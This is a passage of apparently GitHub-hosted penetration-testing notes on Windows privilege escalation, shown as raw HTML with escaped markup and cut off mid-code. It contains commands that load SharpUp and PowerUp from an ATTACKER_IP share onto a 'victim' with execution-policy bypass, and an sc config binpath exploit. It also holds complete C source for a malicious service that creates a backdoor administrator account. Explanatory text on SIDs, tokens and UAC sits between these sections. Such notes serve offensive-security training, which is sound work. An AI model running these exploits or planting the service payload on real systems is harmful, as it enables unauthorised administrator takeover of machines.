class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$owner\u003cspan class=\"pl-smi\"\u003e.Domain\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\\\u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$owner\u003cspan class=\"pl-smi\"\u003e.User\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] Command = \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$process\u003cspan class=\"pl-smi\"\u003e.Commandline\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] PID = \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$process\u003cspan class=\"pl-smi\"\u003e.ProcessID\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] PPID = \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$process\u003cspan class=\"pl-smi\"\u003e.ParentProcessID\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[\u003cspan class=\"pl-smi\"\u003e$date\u003c/span\u003e] \u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e60\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003e$logText\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eOut-File\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eFilePath \u003cspan class=\"pl-smi\"\u003e$logPath\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAppend \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eEncoding ascii\n}\n\u003cspan class=\"pl-c1\"\u003eRegister-CimIndicationEvent\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eQuery \u003cspan class=\"pl-smi\"\u003e$query\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eSourceIdentifier \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eWatchProcess\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eAction \u003cspan class=\"pl-smi\"\u003e$action\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to Unsubscribe:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get-EventSubscriber -SourceIdentifier \"WatchProcess\" | Unregister-Event\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2 Windows Privilege Escalation\u003c/h2\u003e\u003ca id=\"user-content-42-windows-privilege-escalation\" class=\"anchor\" aria-label=\"Permalink: 4.2 Windows Privilege Escalation\" href=\"#42-windows-privilege-escalation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSo many options on \u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md\"\u003ePayloadsAllTheThings\u003c/a\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAutomated checks using SharpUp.exe or PowerUp.ps1:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on kali get SharpUp and/or PowerUp, serve on http\nwget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe\ncp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .\nimpacket-smbserver -smb2support -user derp -password herpderp share .\n\n# on victim\n\\\\ATTACKER_IP\\share\\SharpUp.exe audit\n# or\npowershell -ep bypass\n. \\\\ATTACKER_IP\\share\\PowerUp.ps1\nInvoke-AllChecks\n\n# PowerUp, individually:\nGet-UnquotedService\nGet-ModifiableServiceFile\nGet-ModifiableService\nFind-ProcessDLLHijack\nFind-PathDLLHijack\nGet-RegistryAlwaysInstallElevated\nGet-RegistryAutoLogon\nGet-ModifiableRegistryAutoRun\nGet-ModifiableScheduledTaskFile\nGet-UnattendedInstallFile\nGet-WebConfig\nGet-ApplicationHost\nGet-SiteListPassword\nGet-CachedGPPPassword\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali get SharpUp and/or PowerUp, serve on http\u003c/span\u003e\nwget https:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003egithub.com\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003er3motecontrol\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eGhostpack\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCompiledBinaries\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eraw\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003emaster\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eSharpUp.exe\u003c/span\u003e\ncp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eusr\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eshare\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ewindows\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eresources\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003epowersploit\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ePrivesc\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ePowerUp.ps1 .\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esmbserver \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esmb2support \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euser derp \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003epassword herpderp share .\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on victim\u003c/span\u003e\n\\\\ATTACKER_IP\\share\\\u003cspan class=\"pl-c1\"\u003eSharpUp.exe\u003c/span\u003e audit\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eep bypass\n\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e \\\\ATTACKER_IP\\share\\PowerUp.ps1\n\u003cspan class=\"pl-c1\"\u003eInvoke-AllChecks\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PowerUp, individually:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-UnquotedService\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ModifiableServiceFile\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ModifiableService\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-ProcessDLLHijack\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eFind-PathDLLHijack\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-RegistryAlwaysInstallElevated\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-RegistryAutoLogon\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ModifiableRegistryAutoRun\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ModifiableScheduledTaskFile\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-UnattendedInstallFile\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-WebConfig\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ApplicationHost\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-SiteListPassword\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-CachedGPPPassword\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eBackground on Windows Permissions:\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eKnowing how Windows identifies principals is necessary to understand access tokens. It's also critical for understanding how to move around in Active Directory.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eA \u003cstrong\u003eSecurity Identifier (SID)\u003c/strong\u003e is how Windows identifies entities such as users or groups, formally called \u003cem\u003eprincipals\u003c/em\u003e, that that can be authenticated. Local SIDs are generated by the \u003cem\u003eLocal Security Authority (LSA)\u003c/em\u003e. Domain SIDs are generated by the \u003cem\u003eDomain Controller (DC)\u003c/em\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThe SID format is \u003ccode\u003eS-R-X-Y\u003c/code\u003e:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cem\u003eS\u003c/em\u003e: SIDs always start with the literal \"S\".\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eR\u003c/em\u003e: \u003cem\u003erevision\u003c/em\u003e; it is always set to 1 (SIDS still currently on 1st revision).\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eX\u003c/em\u003e: identifier authority (who issued the SID); \"5\" is most common, representing \"NT Authority\", used for both local and domain users/groups.\u003c/li\u003e\n\u003cli\u003e\u003cem\u003eY\u003c/em\u003e: sub-authorities of identifier authority. This part consists of both the domain identifier and the \u003cem\u003eRelative Identifier (RID)\u003c/em\u003e. The domain identifier is the SID of the domain for domain users, the SID of the local machine for local users, and \"32\" for built-in principals. The RID is like a unique index/ID for a user/group within that domain ID. It's almost like a \u003ccode\u003euid\u003c/code\u003e or \u003ccode\u003egid\u003c/code\u003e in Unix.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eSIDs with RIDs under 1000 are well-known SIDs, identifying built-in users/groups. Here are some useful ones to know:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"S-1-0-0                       Nobody        \nS-1-1-0\t                      Everybody\nS-1-5-11                      Authenticated Users\nS-1-5-18                      Local System\nS-1-5-domainidentifier-500    Administrator\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eS-1-0-0                       Nobody        \nS-1-1-0\t                      Everybody\nS-1-5-11                      Authenticated Users\nS-1-5-18                      Local System\nS-1-5-domainidentifier-500    Administrator\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSIDs starting with 1000 and incrementing up are local users/groups.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOnce a user is authenticated, Windows generates an \u003cem\u003eaccess token\u003c/em\u003e that is assigned to that user. The token itself contains various pieces of information that effectively describe the \u003cem\u003esecurity context\u003c/em\u003e of a given user. The security context is a set of rules or attributes that are currently in effect, including the user's SID, the SIDs of the user's groups, etc.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWhen a user starts a process or thread, a copy of the user's access token will be assigned to these objects. This token, called a \u003cem\u003eprimary token\u003c/em\u003e, specifies which permissions the process or threads have when interacting with another object. A thread can also have an \u003cem\u003eimpersonation token\u003c/em\u003e assigned, which is used to provide a different security context than the process that owns the thread, allowing the thread to act on behalf of a different set of access rights.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWindows also implements what is known as \u003cem\u003eMandatory Integrity Control\u003c/em\u003e. It uses \u003cem\u003eintegrity levels\u003c/em\u003e to control access to securable objects. A principal with a lower integrity level cannot write to an object with a higher level, even if the permissions would normally allow them to do so. When processes are started or objects are created, they receive the integrity level of the principal performing this operation.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFrom Windows Vista onward, processes run on four integrity levels:\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"- System: SYSTEM (kernel, ...)\n- High: Elevated users (Administrators)\n- Medium: Standard users\n- Low: very restricted rights often used in sandboxed processes or for directories storing temporary data\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e- System: SYSTEM (kernel, ...)\n- High: Elevated users (Administrators)\n- Medium: Standard users\n- Low: very restricted rights often used in sandboxed processes or for directories storing temporary data\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eHow to see integrity levels:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eProcesses: Process Explorer (Sysinternals)\u003c/li\u003e\n\u003cli\u003eCurrent User: \u003ccode\u003ewhoami /groups\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eFiles: \u003ccode\u003eicacls\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003eUser Account Control (UAC)\u003c/em\u003e is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or \u003cem\u003efiltered admin token\u003c/em\u003e), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a UAC consent prompt normally needs to be confirmed.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.1 Check Windows File Permissions\u003c/h3\u003e\u003ca id=\"user-content-421-check-windows-file-permissions\" class=\"anchor\" aria-label=\"Permalink: 4.2.1 Check Windows File Permissions\" href=\"#421-check-windows-file-permissions\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWeak permissions can provide a privesc vector.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Using accesschk from SysInternals Suite\n# checking file write permissions\naccesschk.exe /accepteula -quvw c:\\path\\to\\some\\file.exe\n\n# checking registry key permissions\naccesschk.exe /accepteula -quvwk c:\\path\\to\\some\\file.exe\n\n# checking service configuration change permissions\naccesschk.exe /accepteula -quvwc SERVICENAME\n# if you have SERVICE_CHANGE_CONFIG permissions, exploit by changing binpath\n# e.g. sc config SERVICENAME binpath= \u0026quot;net localgroup administrators user /add\u0026quot;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Using accesschk from SysInternals Suite\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e checking file write permissions\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eaccesschk.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eaccepteula \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003equvw c:\\path\\to\\some\\\u003cspan class=\"pl-c1\"\u003efile.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e checking registry key permissions\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eaccesschk.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eaccepteula \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003equvwk c:\\path\\to\\some\\\u003cspan class=\"pl-c1\"\u003efile.exe\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e checking service configuration change permissions\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eaccesschk.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eaccepteula \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003equvwc SERVICENAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you have SERVICE_CHANGE_CONFIG permissions, exploit by changing binpath\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e e.g. sc config SERVICENAME binpath= \"net localgroup administrators user /add\"\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e4.2.2 Windows Service Escalation - Registry\u003c/h3\u003e\u003ca id=\"user-content-422-windows-service-escalation---registry\" class=\"anchor\" aria-label=\"Permalink: 4.2.2 Windows Service Escalation - Registry\" href=\"#422-windows-service-escalation---registry\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eVulnerable when:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl\n# shows NT AUTHORITY\\INTERACTIVE has FullControl\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003eGet-Acl\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath hklm:\\System\\CurrentControlSet\\services\\regsvc \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fl\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e shows NT AUTHORITY\\INTERACTIVE has FullControl\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003ewindows_service.c\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"// compile with:\n// x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe\n#include \u0026lt;windows.h\u0026gt;\n#include \u0026lt;stdio.h\u0026gt;\n\n#define SLEEP_TIME 5000\n\nSERVICE_STATUS ServiceStatus;\nSERVICE_STATUS_HANDLE hStatus;\n\nvoid ServiceMain(int argc, char** argv);\nvoid ControlHandler(DWORD request);\n\n//add the payload here\nint Run()\n{\n    system (\u0026quot;net user derp herpderp /add\u0026quot;);\n    system (\u0026quot;net localgroup administrators derp /add\u0026quot;);\n    return 0;\n}\n\nint main()\n{\n    SERVICE_TABLE_ENTRY ServiceTable[2];\n    ServiceTable[0].lpServiceName = \u0026quot;Derp\u0026quot;;\n    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;\n\n    ServiceTable[1].lpServiceName = NULL;\n    ServiceTable[1].lpServiceProc = NULL;\n\n    StartServiceCtrlDispatcher(ServiceTable);\n    return 0;\n}\n\nvoid ServiceMain(int argc, char** argv)\n{\n    ServiceStatus.dwServiceType        = SERVICE_WIN32;\n    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;\n    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;\n    ServiceStatus.dwWin32ExitCode      = 0;\n    ServiceStatus.dwServiceSpecificExitCode = 0;\n    ServiceStatus.dwCheckPoint         = 0;\n    ServiceStatus.dwWaitHint           = 0;\n\n    hStatus = RegisterServiceCtrlHandler(\u0026quot;Derp\u0026quot;, (LPHANDLER_FUNCTION)ControlHandler);\n    Run();\n\n    ServiceStatus.dwCurrentState = SERVICE_RUNNING;\n    SetServiceStatus (hStatus, \u0026amp;ServiceStatus);\n\n    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)\n    {\n\t\tSleep(SLEEP_TIME);\n    }\n    return;\n}\n\nvoid ControlHandler(DWORD request)\n{\n    switch(request)\n    {\n        case SERVICE_CONTROL_STOP:\n\t\t\tServiceStatus.dwWin32ExitCode = 0;\n            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;\n            SetServiceStatus (hStatus, \u0026amp;ServiceStatus);\n            return;\n\n        case SERVICE_CONTROL_SHUTDOWN:\n            ServiceStatus.dwWin32ExitCode = 0;\n            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;\n            SetServiceStatus (hStatus, \u0026amp;ServiceStatus);\n            return;\n\n        default:\n            break;\n    }\n    SetServiceStatus (hStatus,  \u0026amp;ServiceStatus);\n    return;\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e// compile with:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e// x86_64-w64-mingw32-gcc windows_service.c -o winsvc.exe\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;windows.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003e#define\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eSLEEP_TIME\u003c/span\u003e 5000\n\n\u003cspan class=\"pl-smi\"\u003eSERVICE_STATUS\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eServiceStatus\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003eSERVICE_STATUS_HANDLE\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehStatus\u003c/span\u003e;\n\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eServiceMain\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003eint\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eargc\u003c/span\u003e, \u003cspan class=\"pl-smi\"\u003echar\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eargv\u003c/span\u003e);\n\u003cspan class=\"pl-smi\"\u003evoid\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eControlHandler\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003eDWORD\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003erequest\u003c/span\u003e);\n\n\u003cspan class=\"pl-c\"\u003e//add the payload here\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003eint\u003c/span\u003e \u003cspan class=\"pl-en\"\u003eRun\u003c/span\u003e()\n{\n    \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\"net user derp herpderp /add\"\u003c/span\u003e);\n    \u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\"net localgroup administrators derp /add\"\u003c/span\u003e);\n    \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n}\n\n\u003cspan class=\"pl-smi\"\u003eint\u003c/span\u003e \u003cspan class=\"pl-en\"\u003emain\u003c/span\u003e()\n{\n    \u003cspan class=\"pl-smi\"\u003eSERVICE_TABLE_ENTRY\u003c/span\u003e \u003cspan 